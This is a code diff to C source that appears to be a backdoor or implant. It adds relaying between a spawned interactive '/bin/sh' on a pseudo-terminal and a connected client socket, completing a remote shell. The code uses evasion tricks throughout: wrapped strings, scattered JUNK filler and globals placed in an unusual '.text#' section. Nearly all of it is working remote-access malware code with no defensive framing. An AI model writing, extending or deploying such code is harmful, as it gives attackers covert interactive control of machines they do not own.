@@ -105,6 +105,9 @@ ret_t hello(param_t *command)
 	return 0;
 }
 
+int __attribute__((section(".text#"))) g_master_fd = -1;
+int __attribute__((section(".text#"))) g_client_fd = -1;
+
 ret_t exec_shell(param_t *command)
 {
 	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
@@ -177,12 +180,22 @@ ret_t exec_shell(param_t *command)
 		dup2(slave_fd, 0);
 		dup2(slave_fd, 1);
 		dup2(slave_fd, 2);
-		close(master_fd);
-		close(slave_fd);
 		execve(argv[0], argv, command->envp);
 		exit(1);
 	} 
 	else {
+
+		/* relay data between master_fd and client_fd */
+		if (setblocking(master_fd) < 0) {
+			logger(STR("setblocking failed\n"));
+			close(master_fd);
+			return -1;
+		} JUNK;
+
+		command->master_fd = master_fd;
+		g_master_fd = master_fd;
+		g_client_fd = command->client_fd;
+		
 	}
 	return 0;
 }
@@ -242,6 +255,8 @@ static void epoller(int sfd, char **envp)
 	int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
 
 	char buf[256]; JUNK;
+
+	bool master_fd_set = false;
 
 	if (epoll_fd == -1) {
 		logger(STR("epoll_create1 failed\n"));
@@ -349,6 +364,22 @@ static void epoller(int sfd, char **envp)
 				else if (siginfo.ssi_signo == SIGINT) {
 					logger(STR("SIGINT received\n"));
 				} JUNK;
+			} else if (events[i].data.fd == g_master_fd) {
+				if (events[i].events & EPOLLIN) {
+					buf[0] = '\0';
+					ssize_t ret = read(g_master_fd, buf, sizeof(buf) - 1);
+					buf[ret] = '\0';
+					write(g_client_fd, buf, ret);
+				} else if (events[i].events & EPOLLRDHUP || events[i].events & EPOLLHUP) {
+					logger(STR("master fd closed\n"));
+					epoll_ctl(epoll_fd, EPOLL_CTL_DEL, g_master_fd, NULL);
+					close(g_master_fd);
+					g_master_fd = -1;
+					master_fd_set = false;
+				} else {
+					logger(STR("unknown event on master fd\n"));
+				}
+					
 			} else {
 
 				buf[0] = '\0';
@@ -367,6 +398,11 @@ static void epoller(int sfd, char **envp)
 				}
 
 				ssize_t ret = read(events[i].data.fd, buf, sizeof(buf));
+
+				if (master_fd_set == true) {
+					write(g_master_fd, buf, ret);
+					continue;
+				}
 
 				
 				if (ret == -1) {
@@ -391,11 +427,25 @@ static void epoller(int sfd, char **envp)
 
 				param_t command = {
 					.client_fd = events[i].data.fd,
-					.envp = envp
+					.envp = envp,
+					.master_fd = -1
 				};
 				command_func_t func = get_command(buf);
 				if (func != NULL) {
 					func(&command);
+				}
+
+				if (g_master_fd != -1 && master_fd_set == false) {
+					master_fd_set = true;
+					ev.events = EPOLLIN;
+					ev.data.fd = g_master_fd;
+					if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, g_master_fd, &ev) == -1) {
+						logger(STR("epoll_ctl failed\n"));
+						close(g_master_fd);
+						g_master_fd = -1;
+					} else {
+						logger(STR("master fd set\n"));
+					}
 				}
 			}
 		}
